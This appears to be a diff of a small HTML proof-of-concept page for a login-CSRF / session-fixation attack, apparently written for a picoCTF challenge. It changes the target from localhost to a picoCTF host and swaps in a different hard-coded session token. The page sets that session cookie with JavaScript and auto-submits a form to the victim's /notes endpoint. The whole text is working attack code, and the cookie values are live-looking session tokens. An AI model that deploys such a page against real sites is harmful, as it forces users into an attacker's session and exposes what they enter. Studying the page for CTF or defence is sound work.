@@ -1,13 +1,13 @@
-<!-- Login CSRF PoC to force the user to use your session -->
+<!-- CSRF PoC to send a custom session token -->
 <html>
   <body>
-    <form action="http://127.0.0.1/notes" method="GET">
+    <form action="http://saturn.picoctf.net:51014/notes" method="GET">
       <input type="submit" value="Submit request" />
     </form>
 
     <script>
-      // Manually set your session cookie with SameSite=None and Secure attributes
-      document.cookie = "session=ekgI9%2BTr8PfMGByyddoYmTPzVM2loiugQ%2B9SKIREuCyLkDjVT8Ol1wpP%2FIetv5DiAgf%2B0m4dPVj4YBJx9ZpCsNRNVQ%3D%3D%3B%2Fu2F9TtyXl47ywpHBu4IVpTg2Oo2TO1s; path=/notes; domain=127.0.0.1; SameSite=None; Secure";
+      // Manually set the session cookie with SameSite=None and Secure attributes
+      document.cookie = "session=VzEKFagGWXbaDSxP9q%2F06AL1HyjcUvo1mewsXmik6PpZLI%2BYH5NfUPfEK3X446wKhLCUvYwTViMXEyzsBuMA1sRamRorpVs%3D%3Bu9H%2Fa3RSsLBCokGAV%2BLm49oTO%2F7T7NRY; path=/notes; domain=saturn.picoctf.net:51014; SameSite=None; Secure";
 
       // Automatically submit the form to trigger the CSRF request
       document.forms[0].submit();
